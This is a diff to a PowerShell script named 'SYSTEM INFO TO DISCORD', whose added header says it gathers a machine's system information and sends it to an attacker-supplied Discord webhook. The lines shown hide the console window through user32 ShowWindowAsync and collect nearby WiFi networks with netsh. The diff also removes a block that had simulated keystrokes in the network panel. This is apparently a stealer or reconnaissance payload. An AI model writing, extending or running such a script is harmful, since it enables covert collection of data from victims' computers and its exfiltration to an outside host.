@@ -1,4 +1,14 @@
-# SYSTEM INFO TO DISCORD
+<# ========================================= SYSTEM INFO TO DISCORD ================================================
+
+SYNOPSIS
+This script gathers a bunch of system information and sends everything to a discord webhook
+
+USAGE
+1. Specify your webhook inside the txt file or below in the $hookurl variable
+2. Run the script
+3. Check discord for results (can take upto 3 mins to run.)
+
+#>
 
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
@@ -191,18 +201,6 @@ if ($localIP -match '^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$') {
 }
 
 # Nearby WiFi Networks
-$showNetworks = explorer.exe ms-availablenetworks:
-sleep 4
-$wshell = New-Object -ComObject wscript.shell
-$wshell.AppActivate('explorer.exe')
-$tab = 0
-while ($tab -lt 6){
-$wshell.SendKeys('{TAB}')
-$tab++
-}
-$wshell.SendKeys('{ENTER}')
-$wshell.SendKeys('{TAB}')
-$wshell.SendKeys('{ESC}')
 $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
 $Wifi = ($NearbyWifi|Out-String)
 
